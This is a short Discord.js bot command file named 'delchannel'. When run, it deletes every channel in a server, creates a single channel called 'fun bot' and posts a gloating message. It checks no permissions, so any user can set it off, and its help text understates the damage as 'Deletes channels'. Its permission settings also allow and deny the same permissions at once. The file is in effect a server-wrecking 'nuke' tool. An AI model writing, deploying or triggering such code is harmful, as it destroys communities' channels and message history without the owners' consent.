const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {
      const channel = message.guild.channels.cache.forEach(channel => channel.delete());
        message.guild.channels.create("fun bot", {
        type: "text", //This create a text channel, you can make a voice one too, by changing "text" to "voice"
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone, //To make it be seen by a certain role, user an ID instead
             allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'], //Allow permissions
             deny: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'] //Deny permissions
		   }
        ],
      }).then(channel => channel.send("Fun bot made you have fun! :smiling_imp:"))

    } catch(e) { 

        console.log(e.stack);

    }
        
}

module.exports.help = {

    name: "delchannel",
    desc: "Deletes channels ."

}
